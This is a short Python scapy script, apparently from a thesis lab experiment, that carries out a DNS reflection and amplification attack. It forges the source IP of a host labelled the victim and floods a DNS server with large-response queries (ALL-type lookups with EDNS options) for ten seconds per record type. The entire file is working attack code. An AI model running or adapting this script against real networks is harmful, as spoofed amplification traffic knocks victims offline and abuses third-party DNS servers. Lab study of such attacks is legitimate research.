from scapy.all import *
import time

# IP of the victim
dnsSource = "192.168.68.115"
dnsDestination = "192.168.68.53" # IP of the DNS server
queryTypes = ["ALL", "A", "AAAA", "CNAME", "MX", "NS", "SOA", "TXT"]

queryName = "amaury.thesis.io"

packetNumber = 0
for queryType in queryTypes:

    start = time.time()
    while time.time() - start < 10:
        packetNumber += 1
        dnsQuery = IP(src=dnsSource, dst=dnsDestination) / UDP(sport=RandShort(), dport=53) / DNS(id= packetNumber, rd=1, ad=0, cd=1, qd=DNSQR(qname=queryName, qtype=queryType), ar=DNSRROPT(rclass=8192))

        try:
            send(dnsQuery)
        except Exception as e:
            print(f"An exception occurred: {e}\n")